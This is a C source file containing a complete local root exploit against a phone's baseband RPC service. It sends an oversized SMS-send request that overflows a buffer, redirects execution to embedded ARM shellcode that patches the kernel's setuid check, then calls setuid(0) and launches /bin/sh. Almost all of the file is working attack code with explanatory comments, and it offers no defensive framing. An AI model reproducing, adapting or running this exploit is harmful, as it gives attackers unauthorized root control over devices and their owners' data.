#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <errno.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>

// Open a socket to the baseband RPC
int rpcsock()
{
    char sa[] = {
        0x29, 0x00,
        0x00, 0x00,
        0x00, 0x00, 0x00, 0x00,
        0x65, 0x00, 0x00, 0x00
    };
    struct sockaddr *sas = (struct sockaddr *)sa;
    int fd = socket(41, 5, 0);
    if (fd < 0)
    {
        printf("Could not open socket\n");
        exit(1);
    }
    if (connect(fd, sas, 0xC) != 0)
    {
        printf("Could not connect\n");
        exit(1);
    }
    return fd;
}

char req[] = {
    // type 2, sms send
    0x02, 0x00, 0x00, 0x00,
    // target phone number
    0x00, 0x00, 0x00, 0x00
};

// Shellcode to poke the kernel's sys_setuid
// It patches a beq into a nop @ 0xc0034bd8
// (the physical address is 0x08034bd8)
char shell[] = {
    0x0c, 0x10, 0x9f, 0xe5, // ldr  r1, [pc, #12]
    0x0c, 0x20, 0x9f, 0xe5, // ldr  r2, [pc, #12]
    0x02, 0x28, 0xa0, 0xe1, // lsl  r2, r2, #16
    0x08, 0x20, 0x81, 0xe5, // str  r2, [r1, #8]
    0xfe, 0xff, 0xff, 0xea, // b    0 <pc>
    0xd0, 0x4b, 0x03, 0x08, // .word    0x08034bd0
    0xa0, 0xe1, 0xff, 0xff  // .word    0xffffe1a0
};

int main(int argc, char **argv)
{
    int rpc = rpcsock();

    // Create the payload
    //  - two Z bytes to align to 4 bytes
    //  - shellcode
    //  - overflow past buffer into saved pc
    //  - pc set to beginning of shellcode (0x203390)
    uint8_t *buf = malloc(sizeof(req) + 178 + 8);
    memcpy(buf, req, sizeof(req));
    memcpy(buf+sizeof(req), "ZZ", 2);
    memcpy(buf+sizeof(req)+2, shell, sizeof(shell));
    memset(buf+sizeof(req)+2+sizeof(shell), 'a', 176-sizeof(shell));
    memcpy(buf+sizeof(req)+178, "\xde\xad\xbe\xef", 4);
    memcpy(buf+sizeof(req)+182, "\x90\x33\x20\x00", 4);

    // Send it!
    send(rpc, buf, sizeof(req)+186, 0);

    // The baseband RPC thread is now hanged (or crashed if something went
    // wrong)

    // Since ARM is cache-incoherent, do some sleeps until the setuid patch 
    // takes place.
    int retries = 10;
    do
    {
        retries--;
        sleep(3);
    }
    while (setuid(0) == -1 && retries > 0);

    // Give it a shot.
    char *args[] = {"/bin/sh", 0};
    execve(args[0], args, 0);
    return 0;
}
